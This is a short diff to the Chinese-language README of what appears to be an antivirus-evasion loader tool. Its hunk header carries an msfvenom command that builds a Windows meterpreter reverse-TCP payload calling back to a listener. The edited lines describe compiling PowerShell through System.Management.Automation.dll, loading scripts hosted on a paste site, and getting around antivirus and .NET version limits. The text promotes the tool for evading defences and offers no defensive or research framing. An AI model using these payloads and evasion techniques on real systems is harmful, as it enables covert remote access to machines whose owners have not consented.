@@ -133,7 +133,7 @@ msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f 
 
 ## 0x03.Automation_loader
 
-* 注意C#和Nim的Automation_loader，这个模块是用来编译powershell脚本的，因此您需要将powershell脚本上传到网页上，例如：https://pastebin.mozilla.org/.
+* 注意C#和Nim的Automation_loader，这个模块调用了System.Management.Automation.dll,编译powershell脚本，因此您需要将powershell脚本上传到网页上，例如：https://pastebin.mozilla.org/.
 * powershell和C#相对于其它语言的免杀有更好的效果，但是.NET版本限制也是一大软肋，好在我已经解决了版本限制问题，这样显得它不会更糟糕.
 
 ![image-20221219150031777](Image/image-20221219150031777.png)
